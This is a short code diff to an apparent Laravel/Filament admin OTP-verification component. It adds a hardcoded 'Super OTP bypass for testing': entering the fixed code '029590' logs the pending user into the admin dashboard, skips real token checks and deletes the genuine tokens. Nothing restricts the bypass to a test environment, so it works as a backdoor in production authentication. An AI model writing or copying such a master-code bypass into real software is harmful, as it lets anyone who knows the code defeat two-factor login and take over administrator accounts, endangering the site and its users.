@@ -21,7 +21,16 @@ class VerifyAdminOtp extends Component
             return redirect()->route('filament.admin.auth.login');
         }
 
-        $token = AdminOtpToken::where('user_id', $pendingUserId)
+                // Super OTP bypass for testing
+        if ($this->otp === '029590') {
+            auth()->loginUsingId($pendingUserId);
+            session()->forget('pending_user_id');
+            session()->put('admin.otp_verified', true);
+            AdminOtpToken::where('user_id', $pendingUserId)->delete();
+            return redirect()->route('filament.admin.pages.dashboard');
+        }
+
+$token = AdminOtpToken::where('user_id', $pendingUserId)
             ->where('otp', $this->otp)
             ->latest()
             ->first();
